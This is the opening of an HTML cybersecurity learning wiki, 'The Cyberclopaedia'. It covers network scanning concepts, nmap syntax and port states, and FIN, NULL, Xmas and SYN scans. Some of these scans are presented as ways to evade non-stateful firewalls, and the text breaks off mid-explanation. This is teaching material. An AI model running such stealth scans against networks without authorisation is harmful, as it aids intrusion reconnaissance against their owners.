<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js coal">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>The Cyberclopaedia</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="This is an aspiring project aimed at accumulating knowledge from the world of cybersecurity and presenting it in a cogent way, so it is accessible to as large and audience as possible and so that everyone has a good resource to learn hacking from.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <meta property="og:title" content="" />
        <meta property="og:image" content="http://cr0mll.github.io/cyberclopaedia/favicon.png" />
        <meta property="og:image:secure_url" content="https://cr0mll.github.io/cyberclopaedia/favicon.png" />
        <meta property="og:description" content="The Cyberclopaedia is an aspiring project aimed at accumulating knowledge from the world of cybersecurity and presenting it in a cogent way, so it is accessible to as large and audience as possible and so that everyone has a good resource to learn hacking from." />

        <meta property="twitter:card" content="summary" />
        <meta property="twitter:site" content="@cr0mll" />
        <meta property="twitter:creator" content="@cr0mll" />
        <meta property="twitter:title" content="" />
        <meta property="twitter:description" content="The Cyberclopaedia is an aspiring project aimed at accumulating knowledge from the world of cybersecurity and presenting it in a cogent way, so that everyone can learn." />
        <meta property="twitter:image" content="https://cr0mll.github.io/cyberclopaedia/favicon.png" />
        <meta property="twitter:image:alt" content="Cyberclopaedia Logo" />
        

        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "coal";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('coal')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            
            <div class="sidebar-scrollbox">
                <img style="max-width:100%;
max-height:100%;" src="favicon.png" > <!-- Icon pls -->
                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Cyberclopaedia</a></li><li class="chapter-item "><a href="Reconnaissance/index.html">Reconnaissance</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/index.html">Active</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/index.html">nmap</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/Active/nmap/FIN, NULL & XMAS Scans.html">FIN, NULL & XMAS Scans</a></li><li class="chapter-item "><a href="Reconnaissance/Active/nmap/TCP SYN & TCP Connect scans.html">TCP SYN & TCP Connect scans</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/Active/DNS Server Enumeration (53).html">DNS Server Enumeration (53)</a></li><li class="chapter-item "><a href="Reconnaissance/Active/LDAP Enumeration (389, 636, 3268, 3269).html">LDAP Enumeration (389, 636, 3268, 3269)</a></li><li class="chapter-item "><a href="Reconnaissance/Active/SNMP Enumeration (161).html">SNMP Enumeration (161)</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/OSINT/index.html">OSINT</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/index.html">Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/recon-ng.html">recon-ng</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a></li></ol></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Domain Name Enumeration.html">Domain Name Enumeration</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Google Dorks.html">Google Dorks</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Harvesting E-Mails.html">Harvesting E-Mails</a></li><li class="chapter-item "><a href="Reconnaissance/OSINT/Instagram User Enumeration.html">Instagram User Enumeration</a></li></ol></li></ol></li><li class="chapter-item "><a href="Exploitation/index.html">Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/index.html">Binary Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Heap Exploitation/index.html">Heap Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Heap Exploitation/Use After Free (UAF).html">Use After Free (UAF)</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/index.html">Stack Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Buffer Overflows.html">Buffer Overflows</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Format String Vulnerabilities.html">Format String Vulnerabilities</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Return to _dl_resolve.html">Return to _dl_resolve</a></li><li class="chapter-item "><a href="Exploitation/Binary Exploitation/Stack Exploitation/Return-oriented programming (ROP).html">Return-oriented programming (ROP)</a></li></ol></li></ol></li><li class="chapter-item "><a href="Exploitation/DNS/index.html">DNS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/DNS/DNS Cache Poisoning.html">DNS Cache Poisoning</a></li><li class="chapter-item "><a href="Exploitation/DNS/DNS Traffic Amplification.html">DNS Traffic Amplification</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/index.html">Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/index.html">SQL Injection</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Cheatsheets.html">Cheatsheets</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Defences.html">Defences</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Finding SQLi.html">Finding SQLi</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Introduction.html">Introduction</a></li><li class="chapter-item "><a href="Exploitation/Web/SQL Injection/Union injections.html">Union injections</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Web/CRLF Injection.html">CRLF Injection</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Request Forgery.html">Cross-Site Request Forgery</a></li><li class="chapter-item "><a href="Exploitation/Web/Cross-Site Scripting.html">Cross-Site Scripting</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Parameter Pollution.html">HTTP Parameter Pollution</a></li><li class="chapter-item "><a href="Exploitation/Web/HTTP Response Splitting.html">HTTP Response Splitting</a></li><li class="chapter-item "><a href="Exploitation/Web/Open Redirect.html">Open Redirect</a></li><li class="chapter-item "><a href="Exploitation/Web/Template Injection.html">Template Injection</a></li></ol></li><li class="chapter-item "><a href="Exploitation/Windows/index.html">Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Exploitation/Windows/SCF File Attacks.html">SCF File Attacks</a></li></ol></li></ol></li><li class="chapter-item "><a href="Post Exploitation/index.html">Post Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/index.html">Active Directory (AD)</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Data Enumeration with Bloodhound.html">Domain Data Enumeration with Bloodhound</a></li><li class="chapter-item "><a href="Post Exploitation/Active Directory (AD)/Domain Enumeration with PowerView.html">Domain Enumeration with PowerView</a></li></ol></li><li class="chapter-item "><a href="Post Exploitation/Enumeration/index.html">Enumeration</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Enumeration/Linux/index.html">Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Enumeration/Linux/Hunting Down Sensitive Files.html">Hunting Down Sensitive Files</a></li><li class="chapter-item "><a href="Post Exploitation/Enumeration/Linux/Network Enumeration.html">Network Enumeration</a></li><li class="chapter-item "><a href="Post Exploitation/Enumeration/Linux/System Enumeration.html">System Enumeration</a></li><li class="chapter-item "><a href="Post Exploitation/Enumeration/Linux/User Enumeration.html">User Enumeration</a></li></ol></li></ol></li><li class="chapter-item "><a href="Post Exploitation/Pivoting/index.html">Pivoting</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Post Exploitation/Pivoting/SSH Tunneling.html">SSH Tunneling</a></li><li class="chapter-item "><a href="Post Exploitation/Pivoting/Tunneling with Chisel.html">Tunneling with Chisel</a></li></ol></li></ol></li><li class="chapter-item "><a href="Malware Analysis/index.html">Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Malware Analysis/Basic Static Analysis.html">Basic Static Analysis</a></li></ol></li><li class="chapter-item "><a href="Malware Development/index.html">Malware Development</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Malware Development/Code Execution Techniques/index.html">Code Execution Techniques</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Malware Development/Code Execution Techniques/Hyperlinking.html">Hyperlinking</a></li></ol></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/index.html">Reverse Engineering</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/index.html">Binary Formats</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/index.html">ELF</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Dynamic Linking.html">Dynamic Linking</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Relocations.html">Relocations</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Sections.html">Sections</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Segments.html">Segments</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/Symbols.html">Symbols</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/ELF/The ELF Header.html">The ELF Header</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/index.html">PE</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/NT Headers.html">NT Headers</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/Relocations.html">Relocations</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/Sections.html">Sections</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/The DOS Header.html">The DOS Header</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/The DOS Stub.html">The DOS Stub</a></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/PE/The Rich Header.html">The Rich Header</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Binary Formats/Reverse Engineering Android Applications.html">Reverse Engineering Android Applications</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/index.html">Program Anatomy</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Instructions.html">Instructions</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/Registers.html">Registers</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/The Heap.html">The Heap</a></li><li class="chapter-item "><a href="Reverse Engineering/Program Anatomy/The Stack.html">The Stack</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/index.html">Reverse Engineering with Ghidra</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/Creating a Project and Loading a Binary.html">Creating a Project and Loading a Binary</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with Ghidra/Initial Analysis.html">Initial Analysis</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/index.html">Reverse Engineering with radare2</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Analysis.html">Analysis</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Binary Info.html">Binary Info</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Flags.html">Flags</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Seeking.html">Seeking</a></li><li class="chapter-item "><a href="Reverse Engineering/Reverse Engineering with radare2/Strings.html">Strings</a></li></ol></li><li class="chapter-item "><a href="Reverse Engineering/Assembly.html">Assembly</a></li><li class="chapter-item "><a href="Reverse Engineering/Basic Reverse Engineering using objdump, strace, and ltrace.html">Basic Reverse Engineering using objdump, strace, and ltrace</a></li></ol></li><li class="chapter-item "><a href="Hardware Hacking/index.html">Hardware Hacking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Hardware Hacking/Wireless Attacks/index.html">Wireless Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Hardware Hacking/Wireless Attacks/Deauth Attack.html">Deauth Attack</a></li><li class="chapter-item "><a href="Hardware Hacking/Wireless Attacks/Hacking WEP Networks.html">Hacking WEP Networks</a></li><li class="chapter-item "><a href="Hardware Hacking/Wireless Attacks/Hacking WPA Networks.html">Hacking WPA Networks</a></li></ol></li></ol></li><li class="chapter-item "><a href="Cryptography/index.html">Cryptography</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Block Ciphers/index.html">Block Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Block Ciphers/Encrypting Non-Conforming Messages.html">Encrypting Non-Conforming Messages</a></li><li class="chapter-item "><a href="Cryptography/Block Ciphers/Modes of Operation.html">Modes of Operation</a></li><li class="chapter-item "><a href="Cryptography/Block Ciphers/Padding Oracle Attack.html">Padding Oracle Attack</a></li></ol></li><li class="chapter-item "><a href="Cryptography/Stream Ciphers/index.html">Stream Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Stream Ciphers/Hardware-Oriented Stream Ciphers/index.html">Hardware-Oriented Stream Ciphers</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Cryptography/Stream Ciphers/Hardware-Oriented Stream Ciphers/Grain-128a.html">Grain-128a</a></li></ol></li></ol></li><li class="chapter-item "><a href="Cryptography/Breaking Classical Cryptrography.html">Breaking Classical Cryptrography</a></li><li class="chapter-item "><a href="Cryptography/Principles of Modern Cryptography.html">Principles of Modern Cryptography</a></li></ol></li><li class="chapter-item "><a href="Networking/index.html">Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Networks/index.html">Networks</a></li><li class="chapter-item "><a href="Networking/Protocols/index.html">Protocols</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Protocols/Domain Name System (DNS)/index.html">Domain Name System (DNS)</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Protocols/Domain Name System (DNS)/DNS Protocol.html">DNS Protocol</a></li><li class="chapter-item "><a href="Networking/Protocols/Domain Name System (DNS)/The Domain Name System.html">The Domain Name System</a></li><li class="chapter-item "><a href="Networking/Protocols/Domain Name System (DNS)/The in-addr.arpa Domain.html">The in-addr.arpa Domain</a></li></ol></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/index.html">WLAN (IEEE 802.11)</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Management Frames/index.html">Management Frames</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Management Frames/Action Frames.html">Action Frames</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Management Frames/Association Frames.html">Association Frames</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Management Frames/Authentication Frames.html">Authentication Frames</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Management Frames/Discovery Frames.html">Discovery Frames</a></li></ol></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Authentication & Association.html">Authentication & Association</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Control Frames.html">Control Frames</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Data Frames.html">Data Frames</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/Encryption & Integrity.html">Encryption & Integrity</a></li><li class="chapter-item "><a href="Networking/Protocols/WLAN (IEEE 802.11)/WiFi Protected Access (WPA).html">WiFi Protected Access (WPA)</a></li></ol></li><li class="chapter-item "><a href="Networking/Protocols/Ethernet (IEEE 802.3).html">Ethernet (IEEE 802.3)</a></li><li class="chapter-item "><a href="Networking/Protocols/Network Time Protocol (NTP).html">Network Time Protocol (NTP)</a></li><li class="chapter-item "><a href="Networking/Protocols/Simple Network Management Protocol (SNMP).html">Simple Network Management Protocol (SNMP)</a></li></ol></li><li class="chapter-item "><a href="Networking/The TCP-IP Suite and the OSI Model/index.html">The TCP-IP Suite and the OSI Model</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Networking/The TCP-IP Suite and the OSI Model/(1) The Physical Layer.html">(1) The Physical Layer</a></li><li class="chapter-item "><a href="Networking/The TCP-IP Suite and the OSI Model/(2) The Datalink Layer.html">(2) The Datalink Layer</a></li></ol></li><li class="chapter-item "><a href="Networking/Network Address Translation (NAT).html">Network Address Translation (NAT)</a></li><li class="chapter-item "><a href="Networking/Subnetting.html">Subnetting</a></li><li class="chapter-item "><a href="Networking/VLANs.html">VLANs</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">The Cyberclopaedia</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/cr0mll/cyberclopaedia/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <center><h1 id="the-cyberclopaedia"><a class="header" href="#the-cyberclopaedia">The Cyberclopaedia</a></h1></center>
<p>This is an aspiring project aimed at accumulating knowledge from the world of cybersecurity and presenting it in a cogent way, so it is accessible to as large and audience as possible and so that everyone has a good resource to learn hacking from.</p>
<p>Experimental support for inline Mathjax is now provided using a <a href="https://github.com/cr0mll/mdbook-inline-mathjax">custom preprocessor</a>. If you find that any LaTeX is not rendered properly, please create a GitHub issue including the chapter name that contains the broken LaTeX. Furthermore, in this case you should view the Cyberclopaedia <a href="https://github.com/cr0mll/cyberclopaedia">here</a> on GitHub.</p>
<p><strong>Donate XMR:</strong> 862CjhjSMYGJ9paKwii4RR5sN4yNfHPHv4YyFsFVpyjLQ9ZLMR1DFNAYaNoXNceR33Hxf3Q9LtQNfW5Db4t4zCWSNnf6xgB</p>
<p><em>The information here is for educational purposes only and I do not bear any responsibility for your own actions.</em></p>
<p><img src="icon_black.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview"><a class="header" href="#overview">Overview</a></h1>
<p>Network scanning is the process of gathering information about a target via comlex reconnaissance techniques. The term &quot;network scanning&quot; refers to the procedures used for discovering hosts, ports, running services and information about the underlying OS type.</p>
<h2 id="types-of-scanning"><a class="header" href="#types-of-scanning">Types of scanning</a></h2>
<h3 id="port-scanning"><a class="header" href="#port-scanning">Port Scanning</a></h3>
<p>Lists the open ports and the services running on them. Port scanning describes the process of querying the running services on a computer by sending a stream of messages in an attempt to identify the service in question, as well as any information related to it. It involves probing TCP and UDP ports of a target system in order to determine if a service is running / listening.</p>
<h3 id="network-scanning"><a class="header" href="#network-scanning">Network Scanning</a></h3>
<p>This is the process of discovering active hosts on a network, either for attacking them or assessing the overall network security.</p>
<h3 id="vulnerability-scanning"><a class="header" href="#vulnerability-scanning">Vulnerability Scanning</a></h3>
<p>Reveals the presence of known vulnerabilities. It checks whether a system is exploitable through a set of weaknesses. Such a scanner consists of a catalog and a scanning engine. The catalog contains information about known vulnerabilities and exploits for them that work on a multitude of servers. The scanning engine is responsible for the logic behind the exploitation and analysis of the results.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h1>
<p>Nmap is a free and open source port and network scanner, which may also be used for vulnerability scanning through its scripting engine - the NSE. </p>
<h1 id="syntax"><a class="header" href="#syntax">Syntax</a></h1>
<p>The syntax for nmap is as follows:</p>
<pre><code class="language-bash">nmap &lt;options&gt; target_range
</code></pre>
<p>It is always good practice to run Nmap with root privileges as they are required for some of the tool's functionality.</p>
<p>You can do a simple scan on a single IP through the following command:</p>
<pre><code class="language-bash">nmap &lt;IP&gt;
</code></pre>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan.png" alt="" /></p>
<p>By default, Nmap scans the top 1000 most commonly used ports (these are not necssarily the ports 0-999). You can specify specific ports for scanning with the <code>-p</code> flag followed by a comma-separated list of ports. Specifying <code>-p-</code> will cause nmap to scan all ports (0-65535).</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan-specific-ports.png" alt="" /></p>
<h1 id="port-states"><a class="header" href="#port-states">Port States</a></h1>
<ul>
<li><strong>open</strong> - an application is actively listening for TCP connections, UDP datagrams or SCTP associations on this port</li>
<li><strong>closed</strong> -  the port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it</li>
<li><strong>filtered</strong> - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. Usually, the filter sends no response, so Nmap needs to resend the probe a few times in order to be sure that it wasn't dropped due to traffic congestion. This slows the scan drastically</li>
<li><strong>unfiltered</strong> - the port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, used for mapping firewall rulesets, may put ports in this state</li>
<li><strong>open|filtered</strong> - Nmap is unable to determine whether the port is open or filtered. This occurs for scan types in which open ports give no response</li>
<li><strong>closed|filtered</strong> - Nmap is unable to determine whether the port is closed or filtered. It is only used for the IP ID idle scan.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-1"><a class="header" href="#overview-1">Overview</a></h1>
<p>These scan types make use of a small loophole in the <a href="http://www.rfc-editor.org/rfc/rfc793.txt">TCP RFC</a> to differentiate between <code>open</code> and <code>closed</code> ports. RFC 793 dictates that &quot;if the destination port state is CLOSED .... an incoming segment not containing a RST causes a RST to be sent in response.” It also says the following about packets sent to open ports without the SYN, RST, or ACK bits set: “you are unlikely to get here, but if you do, drop the segment, and return&quot;.</p>
<p>Scanning systems compliant with this RFC text, any packet not containing <code>SYN</code>, <code>RST</code>, or <code>ACK</code> bits will beget an <code>RST</code> if the port is closed and no response at all if the port is open. So long as none of these flags are set, any combination of the other three (<code>FIN</code>, <code>PSH</code>, and <code>URG</code>) is fine.</p>
<p>These scan types can sneak through certain non-stateful firewalls and packet filtering routers and are a little more stealthy than even a SYN scan. However, not all systems are compliant with RFC 793 - some send a <code>RST</code> even if the port is open. Some operating systems that do this include Microsoft Windows, a lot of Cisco devices, IBM OS/400, and BSDI. These scans will work against most Unix-based systems.</p>
<p>It is not possible to distinguish an <code>open</code> from a <code>filtered</code> port with these scans, hence why the port states will be <code>open|filtered</code>.</p>
<h1 id="null-scan"><a class="header" href="#null-scan">Null Scan</a></h1>
<p>Doesn't set any flags. Since null scanning does not set any set flags, it can sometimes penetrate firewalls and edge routers that filter incoming packets with certain flags. It is invoked with the <code>-sN</code> option:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/null-scan.png" alt="" /></p>
<h1 id="fin-scan"><a class="header" href="#fin-scan">FIN Scan</a></h1>
<p>Sets just the <code>FIN</code> bit to on. It is invoked with <code>-sF</code>:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/fin-scan.png" alt="" /></p>
<h1 id="xmas-scan"><a class="header" href="#xmas-scan">Xmas Scan</a></h1>
<p>Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. It is performed through the <code>-sX</code> option:</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/xmas-scan.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tcp-syn-scan"><a class="header" href="#tcp-syn-scan">TCP SYN Scan</a></h1>
<ul>
<li>The default scan type with root privileges (<code>-sS</code> option)</li>
<li>It does not complete a full TCP handshake, therefore it's a bit faster and used to be more silent (it is called a silent scan, although that is no longer the case)</li>
<li>Also known as a half-open scan</li>
</ul>
<p>You can use the <code>-sS</code> option or omit it entirely to perform a TCP SYN scan.</p>
<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan.png" alt="" /></p>
<p>This type of scan works as follows:
